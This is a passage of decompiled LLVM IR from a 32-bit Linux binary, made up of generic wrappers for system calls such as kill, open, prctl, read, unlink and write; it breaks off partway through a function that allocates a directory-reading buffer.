  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80515d5 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_80515d5, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_80515d5, -4095
  br i1 %tmp9, label %dec_label_pc_80515ee, label %dec_label_pc_80515e2

dec_label_pc_80515e2:                             ; preds = %dec_label_pc_80515c2
  %v1_80515e2 = call i32 @function_8051a1b(i32 %v0_80515c2)
  %v0_80515e7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515e7 = sub i32 0, %v0_80515e7
  %v2_80515e9 = inttoptr i32 %v1_80515e2 to i32*
  store i32 %v1_80515e7, i32* %v2_80515e9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80515f2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80515ee

dec_label_pc_80515ee:                             ; preds = %dec_label_pc_80515c2, %dec_label_pc_80515e2
  %v2_80515f2 = phi i32 [ %v0_80515c2, %dec_label_pc_80515c2 ], [ %v2_80515f2.pre, %dec_label_pc_80515e2 ]
  %v0_80515ee = phi i32 [ %v2_80515d5, %dec_label_pc_80515c2 ], [ -1, %dec_label_pc_80515e2 ]
  %v2_80515f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80515f0, i32* @edx, align 4
  store i32 %v2_80515f2, i32* @ebx, align 4
  ret i32 %v0_80515ee

; uselistorder directives
  uselistorder i32 %v2_80515d5, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80515ee, { 1, 0 }
}

define i32 @function_80515f4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80515f4:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80515f5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_80515fb = sdiv i32 %sext, 16777216
  %v4_80515ff = ptrtoint i8* %arg1 to i32
  %v3_8051603 = and i32 %arg2, 64
  %v4_8051603 = icmp eq i32 %v3_8051603, 0
  br i1 %v4_8051603, label %dec_label_pc_8051614, label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %dec_label_pc_80515f4
  br label %dec_label_pc_8051614

dec_label_pc_8051614:                             ; preds = %dec_label_pc_80515f4, %dec_label_pc_8051608
  store i32 %v4_80515ff, i32* %ebx.global-to-local, align 4
  %v5_805161f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_80515fb)
  store i32 %v5_805161f, i32* %ebx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v5_805161f, -4095
  br i1 %tmp16, label %dec_label_pc_8051637, label %dec_label_pc_805162b

dec_label_pc_805162b:                             ; preds = %dec_label_pc_8051614
  %v1_805162b = call i32 @function_8051a1b(i32 %v0_80515f5)
  %v0_8051630 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051630 = sub i32 0, %v0_8051630
  %v2_8051632 = inttoptr i32 %v1_805162b to i32*
  store i32 %v1_8051630, i32* %v2_8051632, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051637

dec_label_pc_8051637:                             ; preds = %dec_label_pc_8051614, %dec_label_pc_805162b
  %v0_8051637 = phi i32 [ %v5_805161f, %dec_label_pc_8051614 ], [ -1, %dec_label_pc_805162b ]
  store i32 %v0_80515f5, i32* @ebx, align 4
  ret i32 %v0_8051637

; uselistorder directives
  uselistorder i32 %v5_805161f, { 1, 0, 2 }
  uselistorder i32 %v0_80515f5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051637, { 1, 0 }
  uselistorder label %dec_label_pc_8051614, { 1, 0 }
}

define i32 @function_805163f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805163f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051640 = load i32, i32* @esi, align 4
  store i32 %v0_8051640, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051658 = load i32, i32* @ebx, align 4
  %v5_8051660 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_8051660, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_8051660, -4095
  br i1 %tmp12, label %dec_label_pc_8051678, label %dec_label_pc_805166c

dec_label_pc_805166c:                             ; preds = %dec_label_pc_805163f
  %v1_805166c = call i32 @function_8051a1b(i32 %v0_8051658)
  %v0_8051671 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051671 = sub i32 0, %v0_8051671
  %v2_8051673 = inttoptr i32 %v1_805166c to i32*
  store i32 %v1_8051671, i32* %v2_8051673, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805167b.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051678

dec_label_pc_8051678:                             ; preds = %dec_label_pc_805163f, %dec_label_pc_805166c
  %v2_805167b = phi i32 [ %v0_8051640, %dec_label_pc_805163f ], [ %v2_805167b.pre, %dec_label_pc_805166c ]
  %v0_8051678 = phi i32 [ %v5_8051660, %dec_label_pc_805163f ], [ -1, %dec_label_pc_805166c ]
  store i32 %v2_805167b, i32* %esi.global-to-local, align 4
  ret i32 %v0_8051678

; uselistorder directives
  uselistorder i32 %v5_8051660, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051678, { 1, 0 }
}

define i32 @function_805167e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805167e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805167e = load i32, i32* @edi, align 4
  store i32 %v0_805167e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805168e = load i32, i32* @ebx, align 4
  %v4_8051696 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8051696, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8051696, -4095
  br i1 %tmp12, label %dec_label_pc_80516ae, label %dec_label_pc_80516a2

dec_label_pc_80516a2:                             ; preds = %dec_label_pc_805167e
  %v1_80516a2 = call i32 @function_8051a1b(i32 %v0_805168e)
  %v0_80516a7 = load i32, i32* %edi.global-to-local, align 4
  %v1_80516a7 = sub i32 0, %v0_80516a7
  %v2_80516a9 = inttoptr i32 %v1_80516a2 to i32*
  store i32 %v1_80516a7, i32* %v2_80516a9, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80516b2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80516ae

dec_label_pc_80516ae:                             ; preds = %dec_label_pc_805167e, %dec_label_pc_80516a2
  %v2_80516b2 = phi i32 [ %v0_805167e, %dec_label_pc_805167e ], [ %v2_80516b2.pre, %dec_label_pc_80516a2 ]
  %v0_80516ae = phi i32 [ %v4_8051696, %dec_label_pc_805167e ], [ -1, %dec_label_pc_80516a2 ]
  store i32 %v2_80516b2, i32* %edi.global-to-local, align 4
  ret i32 %v0_80516ae

; uselistorder directives
  uselistorder i32 %v4_8051696, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80516ae, { 1, 0 }
}

define i32 @function_80516b4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80516b4:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = inttoptr i32 %arg2 to i8*
  %stack_var_-4 = alloca i32, align 4
  %v0_80516b4 = load i32, i32* @edi, align 4
  store i32 %v0_80516b4, i32* %stack_var_-4, align 4
  %v4_80516b8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80516b8, i32* %edi.global-to-local, align 4
  %v0_80516c4 = load i32, i32* @ebx, align 4
  %v7_80516cc = call i32 @readlink(i8* %arg1, i8* %tmp6, i32 %arg3)
  store i32 %v7_80516cc, i32* %edi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_80516cc, -4095
  br i1 %tmp14, label %dec_label_pc_80516e4, label %dec_label_pc_80516d8

dec_label_pc_80516d8:                             ; preds = %dec_label_pc_80516b4
  %v1_80516d8 = call i32 @function_8051a1b(i32 %v0_80516c4)
  %v0_80516dd = load i32, i32* %edi.global-to-local, align 4
  %v1_80516dd = sub i32 0, %v0_80516dd
  %v2_80516df = inttoptr i32 %v1_80516d8 to i32*
  store i32 %v1_80516dd, i32* %v2_80516df, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80516e8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80516e4

dec_label_pc_80516e4:                             ; preds = %dec_label_pc_80516b4, %dec_label_pc_80516d8
  %v2_80516e8 = phi i32 [ %v0_80516b4, %dec_label_pc_80516b4 ], [ %v2_80516e8.pre, %dec_label_pc_80516d8 ]
  %v0_80516e4 = phi i32 [ %v7_80516cc, %dec_label_pc_80516b4 ], [ -1, %dec_label_pc_80516d8 ]
  store i32 %v2_80516e8, i32* %edi.global-to-local, align 4
  ret i32 %v0_80516e4

; uselistorder directives
  uselistorder i32 %v7_80516cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80516e4, { 1, 0 }
}

define i32 @function_80516ea() local_unnamed_addr {
dec_label_pc_80516ea:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80516eb = load i32, i32* @esi, align 4
  store i32 %v0_80516eb, i32* %stack_var_-8, align 4
  %v0_8051703 = load i32, i32* @ebx, align 4
  %v1_805170b = call i32 @int80_syscall(i32 142)
  store i32 %v0_8051703, i32* @ebx, align 4
  store i32 %v1_805170b, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_805170b, -4095
  br i1 %tmp12, label %dec_label_pc_8051723, label %dec_label_pc_8051717

dec_label_pc_8051717:                             ; preds = %dec_label_pc_80516ea
  %v1_8051717 = call i32 @function_8051a1b(i32 %v0_8051703)
  %v0_805171c = load i32, i32* %esi.global-to-local, align 4
  %v1_805171c = sub i32 0, %v0_805171c
  %v2_805171e = inttoptr i32 %v1_8051717 to i32*
  store i32 %v1_805171c, i32* %v2_805171e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051726.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051723

dec_label_pc_8051723:                             ; preds = %dec_label_pc_80516ea, %dec_label_pc_8051717
  %v2_8051726 = phi i32 [ %v0_80516eb, %dec_label_pc_80516ea ], [ %v2_8051726.pre, %dec_label_pc_8051717 ]
  %v0_8051723 = phi i32 [ %v1_805170b, %dec_label_pc_80516ea ], [ -1, %dec_label_pc_8051717 ]
  store i32 %v2_8051726, i32* @esi, align 4
  ret i32 %v0_8051723

; uselistorder directives
  uselistorder i32 %v1_805170b, { 1, 0, 2 }
  uselistorder i32 %v0_8051703, { 1, 0 }
  uselistorder label %dec_label_pc_8051723, { 1, 0 }
}

define i32 @function_8051729() local_unnamed_addr {
dec_label_pc_8051729:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051729 = load i32, i32* @ebx, align 4
  store i32 %v0_8051729, i32* %stack_var_-4, align 4
  %v1_8051732 = call i32 @setsid(i32 %v0_8051729)
  store i32 %v1_8051732, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051732, -4095
  br i1 %tmp7, label %dec_label_pc_8051749, label %dec_label_pc_805173d

dec_label_pc_805173d:                             ; preds = %dec_label_pc_8051729
  %v1_805173d = call i32 @function_8051a1b(i32 %v0_8051729)
  %v0_8051742 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051742 = sub i32 0, %v0_8051742
  %v2_8051744 = inttoptr i32 %v1_805173d to i32*
  store i32 %v1_8051742, i32* %v2_8051744, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805174d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051749

dec_label_pc_8051749:                             ; preds = %dec_label_pc_8051729, %dec_label_pc_805173d
  %v2_805174d = phi i32 [ %v0_8051729, %dec_label_pc_8051729 ], [ %v2_805174d.pre, %dec_label_pc_805173d ]
  %v0_8051749 = phi i32 [ %v1_8051732, %dec_label_pc_8051729 ], [ -1, %dec_label_pc_805173d ]
  store i32 %v2_805174d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051749

; uselistorder directives
  uselistorder i32 %v1_8051732, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051749, { 1, 0 }
}

define i32 @function_805174f(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805174f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051750 = load i32, i32* @esi, align 4
  %v4_8051754 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8051754, i32* @ecx, align 4
  %v2_8051760 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp12 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp12, %v2_8051760
  br i1 %or.cond, label %dec_label_pc_8051779, label %dec_label_pc_8051769

dec_label_pc_8051769:                             ; preds = %dec_label_pc_805174f
  %v1_8051769 = call i32 @function_8051a1b(i32 %v0_8051750)
  %v1_805176e = inttoptr i32 %v1_8051769 to i32*
  store i32 22, i32* %v1_805176e, align 4
  br label %dec_label_pc_80517a0

dec_label_pc_8051779:                             ; preds = %dec_label_pc_805174f
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805177e = load i32, i32* @ebx, align 4
  %v7_8051786 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_805177e, i32* @ebx, align 4
  store i32 %v7_8051786, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_8051786, -4095
  br i1 %tmp13, label %dec_label_pc_80517a0, label %dec_label_pc_8051792

dec_label_pc_8051792:                             ; preds = %dec_label_pc_8051779
  %v1_8051792 = call i32 @function_8051a1b(i32 %v0_805177e)
  %v0_8051797 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051797 = sub i32 0, %v0_8051797
  %v2_8051799 = inttoptr i32 %v1_8051792 to i32*
  store i32 %v1_8051797, i32* %v2_8051799, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80517a0

dec_label_pc_80517a0:                             ; preds = %dec_label_pc_8051792, %dec_label_pc_8051779, %dec_label_pc_8051769
  %storemerge = phi i32 [ -1, %dec_label_pc_8051769 ], [ %v7_8051786, %dec_label_pc_8051779 ], [ -1, %dec_label_pc_8051792 ]
  %v2_80517a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80517a0, i32* @edx, align 4
  store i32 %v0_8051750, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8051786, { 1, 0, 2 }
  uselistorder i32 %v0_805177e, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_80517a4() local_unnamed_addr {
dec_label_pc_80517a4:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80517a4 = load i32, i32* @edi, align 4
  store i32 %v0_80517a4, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_80517ac = load i32, i32* @ebx, align 4
  %v1_80517b4 = inttoptr i32 %tmp to i32*
  %v2_80517b4 = call i32 @time(i32* %v1_80517b4)
  store i32 %v0_80517ac, i32* @ebx, align 4
  store i32 %v2_80517b4, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_80517b4, -4095
  br i1 %tmp9, label %dec_label_pc_80517cc, label %dec_label_pc_80517c0

dec_label_pc_80517c0:                             ; preds = %dec_label_pc_80517a4
  %v1_80517c0 = call i32 @function_8051a1b(i32 %v0_80517ac)
  %v0_80517c5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80517c5 = sub i32 0, %v0_80517c5
  %v2_80517c7 = inttoptr i32 %v1_80517c0 to i32*
  store i32 %v1_80517c5, i32* %v2_80517c7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80517d0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80517cc

dec_label_pc_80517cc:                             ; preds = %dec_label_pc_80517a4, %dec_label_pc_80517c0
  %v2_80517d0 = phi i32 [ %v0_80517a4, %dec_label_pc_80517a4 ], [ %v2_80517d0.pre, %dec_label_pc_80517c0 ]
  %v0_80517cc = phi i32 [ %v2_80517b4, %dec_label_pc_80517a4 ], [ -1, %dec_label_pc_80517c0 ]
  store i32 %v2_80517d0, i32* %edi.global-to-local, align 4
  ret i32 %v0_80517cc

; uselistorder directives
  uselistorder i32 %v2_80517b4, { 1, 0, 2 }
  uselistorder i32 %v0_80517ac, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80517cc, { 1, 0 }
}

define i32 @function_80517d2(i8* %arg1) local_unnamed_addr {
dec_label_pc_80517d2:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80517d2 = load i32, i32* @edi, align 4
  store i32 %v0_80517d2, i32* %stack_var_-4, align 4
  %v4_80517d6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80517d6, i32* %edi.global-to-local, align 4
  %v0_80517da = load i32, i32* @ebx, align 4
  %v3_80517e2 = call i32 @unlink(i8* %arg1)
  store i32 %v3_80517e2, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80517e2, -4095
  br i1 %tmp9, label %dec_label_pc_80517fa, label %dec_label_pc_80517ee

dec_label_pc_80517ee:                             ; preds = %dec_label_pc_80517d2
  %v1_80517ee = call i32 @function_8051a1b(i32 %v0_80517da)
  %v0_80517f3 = load i32, i32* %edi.global-to-local, align 4
  %v1_80517f3 = sub i32 0, %v0_80517f3
  %v2_80517f5 = inttoptr i32 %v1_80517ee to i32*
  store i32 %v1_80517f3, i32* %v2_80517f5, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80517fe.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80517fa

dec_label_pc_80517fa:                             ; preds = %dec_label_pc_80517d2, %dec_label_pc_80517ee
  %v2_80517fe = phi i32 [ %v0_80517d2, %dec_label_pc_80517d2 ], [ %v2_80517fe.pre, %dec_label_pc_80517ee ]
  %v0_80517fa = phi i32 [ %v3_80517e2, %dec_label_pc_80517d2 ], [ -1, %dec_label_pc_80517ee ]
  store i32 %v2_80517fe, i32* %edi.global-to-local, align 4
  ret i32 %v0_80517fa

; uselistorder directives
  uselistorder i32 %v3_80517e2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80517fa, { 1, 0 }
}

define i32 @function_8051800(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051800:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051800 = load i32, i32* @edi, align 4
  store i32 %v0_8051800, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051810 = load i32, i32* @ebx, align 4
  %v4_8051818 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8051818, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8051818, -4095
  br i1 %tmp12, label %dec_label_pc_8051830, label %dec_label_pc_8051824

dec_label_pc_8051824:                             ; preds = %dec_label_pc_8051800
  %v1_8051824 = call i32 @function_8051a1b(i32 %v0_8051810)
  %v0_8051829 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051829 = sub i32 0, %v0_8051829
  %v2_805182b = inttoptr i32 %v1_8051824 to i32*
  store i32 %v1_8051829, i32* %v2_805182b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051834.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051830

dec_label_pc_8051830:                             ; preds = %dec_label_pc_8051800, %dec_label_pc_8051824
  %v2_8051834 = phi i32 [ %v0_8051800, %dec_label_pc_8051800 ], [ %v2_8051834.pre, %dec_label_pc_8051824 ]
  %v0_8051830 = phi i32 [ %v4_8051818, %dec_label_pc_8051800 ], [ -1, %dec_label_pc_8051824 ]
  store i32 %v2_8051834, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051830

; uselistorder directives
  uselistorder i32 %v4_8051818, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051830, { 1, 0 }
}

define i32 @function_8051836(i32* %arg1) local_unnamed_addr {
dec_label_pc_8051836:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_8051838 = load i32, i32* @ebx, align 4
  %v12_8051839 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp3, i32* @edi, align 4
  %v2_8051840 = load i32, i32* %arg1, align 4
  %v12_8051840 = icmp eq i32 %v2_8051840, -1
  %v1_8051843 = icmp eq i1 %v12_8051840, false
  br i1 %v1_8051843, label %dec_label_pc_8051855, label %dec_label_pc_8051845

dec_label_pc_8051845:                             ; preds = %dec_label_pc_8051836
  %v1_8051845 = call i32 @function_8051a1b(i32 %v0_8051838)
  %v1_805184a = inttoptr i32 %v1_8051845 to i32*
  store i32 9, i32* %v1_805184a, align 4
  br label %dec_label_pc_805189f

dec_label_pc_8051855:                             ; preds = %dec_label_pc_8051836
  %v1_8051855 = add i32 %tmp3, 24
  store i32 %v12_8051839, i32* @esi, align 4
  %v2_8051864 = call i32 @function_805337a(i32 %v12_8051839, i32 134558583)
  %v1_805186c = call i32 @function_8053377(i32 %v1_8051855)
  store i32 %v1_805186c, i32* @eax, align 4
  %v0_8051871 = load i32, i32* @edi, align 4
  %v1_8051871 = inttoptr i32 %v0_8051871 to i32*
  %v2_8051871 = load i32, i32* %v1_8051871, align 4
  store i32 %v2_8051871, i32* @ebx, align 4
  store i32 -1, i32* %v1_8051871, align 4
  %v2_805187e = call i32 @function_805337a(i32 %v12_8051839, i32 1)
  %v0_8051884 = load i32, i32* @edi, align 4
  %v1_8051884 = add i32 %v0_8051884, 12
  %v2_8051884 = inttoptr i32 %v1_8051884 to i32*
  %v3_8051884 = load i32, i32* %v2_8051884, align 4
  %v1_8051887 = call i32 @function_8052c13(i32 %v3_8051884)
  %v0_805188c = load i32, i32* @edi, align 4
  %v1_805188f = call i32 @function_8052c13(i32 %v0_805188c)
  %v0_8051894 = load i32, i32* @ebx, align 4
  %v1_8051897 = call i32 @function_80514e3(i32 %v0_8051894)
  br label %dec_label_pc_805189f

dec_label_pc_805189f:                             ; preds = %dec_label_pc_8051845, %dec_label_pc_8051855
  %v0_80518a5 = phi i32 [ -1, %dec_label_pc_8051845 ], [ %v1_8051897, %dec_label_pc_8051855 ]
  ret i32 %v0_80518a5

; uselistorder directives
  uselistorder label %dec_label_pc_805189f, { 1, 0 }
}

define i32 @function_80518a6(i32 %arg1) local_unnamed_addr {
dec_label_pc_80518a6:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_80518b7 = inttoptr i32 %arg1 to i8*
  %v3_80518b7 = call i32 @function_80515f4(i8* %v2_80518b7, i32 67584)
  store i32 %v3_80518b7, i32* %eax.global-to-local, align 4
  store i32 %v3_80518b7, i32* @edi, align 4
  %v2_80518c1 = icmp slt i32 %v3_80518b7, 0
  br i1 %v2_80518c1, label %dec_label_pc_805198e, label %dec_label_pc_80518c9

dec_label_pc_80518c9:                             ; preds = %dec_label_pc_80518a6
  %v0_80518c9 = load i32, i32* @ebx, align 4
  %v2_80518cb = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_80518cb, i32* %eax.global-to-local, align 4
  store i32 %v3_80518b7, i32* %stack_var_-124, align 4
  %v4_80518d1 = call i32 @function_8053772(i32 %v3_80518b7, i32 %v2_80518cb, i32 %v0_80518c9, i32 %v0_80518c9)
  store i32 %v4_80518d1, i32* %eax.global-to-local, align 4
  %v2_80518d9 = icmp slt i32 %v4_80518d1, 0
  br i1 %v2_80518d9, label %dec_label_pc_80518ef, label %dec_label_pc_80518dd

dec_label_pc_80518dd:                             ; preds = %dec_label_pc_80518c9
  %v0_80518e2 = load i32, i32* @edi, align 4
  store i32 %v0_80518e2, i32* %stack_var_-124, align 4
  %v3_80518e3 = call i32 @function_805144d(i32 %v0_80518e2, i32 2, i32 1)
  store i32 %v3_80518e3, i32* %eax.global-to-local, align 4
  %v2_80518eb = icmp slt i32 %v3_80518e3, 0
  %v1_80518ed = icmp eq i1 %v2_80518eb, false
  br i1 %v1_80518ed, label %dec_label_pc_8051905, label %dec_label_pc_80518ef

dec_label_pc_80518ef:                             ; preds = %dec_label_pc_80518dd, %dec_label_pc_80518c9
  %v0_80518ef = load i32, i32* %stack_var_-124, align 4
  %v1_80518ef = call i32 @function_8051a1b(i32 %v0_80518ef)
  store i32 %v1_80518ef, i32* %eax.global-to-local, align 4
  store i32 %v1_80518ef, i32* @ebx, align 4
  %v1_80518f9 = inttoptr i32 %v1_80518ef to i32*
  %v2_80518f9 = load i32, i32* %v1_80518f9, align 4
  %v0_80518fb = load i32, i32* @edi, align 4
  store i32 %v0_80518fb, i32* %stack_var_-124, align 4
  %v1_80518fc = call i32 @function_80514e3(i32 %v0_80518fb)
  store i32 %v1_80518fc, i32* %eax.global-to-local, align 4
  %v1_8051901 = load i32, i32* @ebx, align 4
  %v2_8051901 = inttoptr i32 %v1_8051901 to i32*
  store i32 %v2_80518f9, i32* %v2_8051901, align 4
  br label %dec_label_pc_805197a

dec_label_pc_8051905:                             ; preds = %dec_label_pc_80518dd
  store i32 48, i32* %stack_var_-124, align 4
  %v1_805190a = call i32 @function_8051e4e(i32 48)
  store i32 %v1_805190a, i32* %eax.global-to-local, align 4
  store i32 %v1_805190a, i32* @ebx, align 4
  %v1_8051914 = icmp eq i32 %v1_805190a, 0
  br i1 %v1_8051914, label %dec_label_pc_8051966, label %dec_label_pc_8051918

dec_label_pc_8051918:                             ; preds = %dec_label_pc_8051905
  %v0_8051918 = load i32, i32* @edi, align 4
  %v2_8051918 = inttoptr i32 %v1_805190a to i32*
  store i32 %v0_8051918, i32* %v2_8051918, align 4
  %v1_805191a = add i32 %v1_805190a, 16
  %v2_805191a = inttoptr i32 %v1_805191a to i32*
  store i32 0, i32* %v2_805191a, align 4
  %v1_8051921 = add i32 %v1_805190a, 8
  %v2_8051921 = inttoptr i32 %v1_8051921 to i32*
  store i32 0, i32* %v2_8051921, align 4
  %v1_8051928 = add i32 %v1_805190a, 4
  %v2_8051928 = inttoptr i32 %v1_8051928 to i32*
  store i32 0, i32* %v2_8051928, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8051933 = load i32, i32* @ebx, align 4
  %v2_8051933 = add i32 %v1_8051933, 20
  %v3_8051933 = inttoptr i32 %v2_8051933 to i32*
  store i32 %tmp, i32* %v3_8051933, align 4
  %v0_8051936 = load i32, i32* %eax.global-to-local, align 4
  %v6_805193b = icmp ugt i32 %v0_8051936, 511
  br i1 %v6_805193b, label %dec_label_pc_8051944, label %dec_label_pc_805193d

dec_label_pc_805193d:                             ; preds = %dec_label_pc_8051918
  %v0_805193d = load i32, i32* @ebx, align 4
  %v1_805193d = add i32 %v0_805193d, 20
  %v2_805193d = inttoptr i32 %v1_805193d to i32*
  store i32 512, i32* %v2_805193d, align 4
  br label %dec_label_pc_8051944

dec_label_pc_8051944:                             ; preds = %dec_label_pc_8051918, %dec_label_pc_805193d
  %v0_8051946 = load i32, i32* @ebx, align 4
  %v1_8051946 = add i32 %v0_8051946, 20
  %v2_8051946 = inttoptr i32 %v1_8051946 to i32*
  %v3_8051946 = load i32, i32* %v2_8051946, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_805194b = call i32 @function_80525c2(i64 1, i32 %v3_8051946)
  store i32 %v3_805194b, i32* %eax.global-to-local, align 4
  %v1_8051953 = load i32, i32* @ebx, align 4
  %v2_8051953 = add i32 %v1_8051953, 12
  %v3_8051953 = inttoptr i32 %v2_8051953 to i32*
  store i32 %v3_805194b, i32* %v3_8051953, align 4
  %v1_8051956 = icmp eq i32 %v3_805194b, 0
  %v1_8051958 = icmp eq i1 %v1_8051956, false
  br i1 %v1_8051958, label %dec_label_pc_805197e, label %dec_label_pc_805195a

dec_label_pc_805195a:                             ; preds = %dec_label_pc_8051944
  %v0_805195d = load i32, i32* @ebx, align 4
  store i32 %v0_805195d, i32* %stack_var_-124, align 4
  %v1_805195e = call i32 @function_8052c13(i32 %v0_805195d)
  store i32 %v1_805195e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051966

dec_label_pc_8051966:                             ; preds = %dec_label_pc_8051905, %dec_label_pc_805195a
  %v0_8051969 = load i32, i32* @edi, align 4
  store i32 %v0_8051969, i32* %stack_var_-124, align 4
  %v1_805196a = call i32 @function_80514e3(i32 %v0_8051969)
  store i32 %v1_805196a, i32* %eax.global-to-local, align 4
  %v1_805196f = call i32 @function_8051a1b(i32 %v0_8051969)
  store i32 %v1_805196f, i32* %eax.global-to-local, align 4
